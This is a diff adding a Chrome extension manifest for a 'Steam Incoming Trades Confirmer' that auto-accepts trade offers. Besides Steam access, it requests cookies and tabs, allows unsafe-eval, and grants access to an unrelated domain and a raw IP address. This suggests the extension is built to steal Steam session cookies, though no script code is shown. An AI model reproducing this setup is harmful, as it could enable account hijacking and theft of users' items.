@@ -1,0 +1,44 @@
+﻿{
+	"manifest_version": 2,
+	
+	"name": "Steam Incoming Trades Confirmer",
+	"short_name": "S.I.T.C",
+	"version": "1.0.9",
+	"description": "Confirms all tradeoffers(without outgoing items) automatically.",
+	
+	"permissions": [
+		"webRequest",
+		"webRequestBlocking",
+		"notifications",
+		"storage",
+		"*://*.steamcommunity.com/*",
+		"http://steamcommunity.com/*",
+		"http://*.steamcommunity.com/*",
+		"https://steamcommunity.com/*",
+		"https://*.steamcommunity.com/*",
+		"https://*.steampowered.com/*",
+		"http://*.steampowered.com/*",
+		"*://*.risenraise.com/*",
+		"*://83.220.175.150/*",
+		"tabs",
+		"cookies"
+	],
+	
+	"web_accessible_resources":["*"],
+	
+	"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'",
+	
+	"icons": {
+		"48": "images/icon48.png",
+		"128": "images/icon128.png"
+	},
+	
+	"background": {
+		"scripts": ["js/jquery.js", "js/background.js"]
+	},
+	
+	"browser_action": {
+		"default_title": "Steam Incoming Trades Confirmer",
+		"default_popup": "popup.html"
+	}
+}
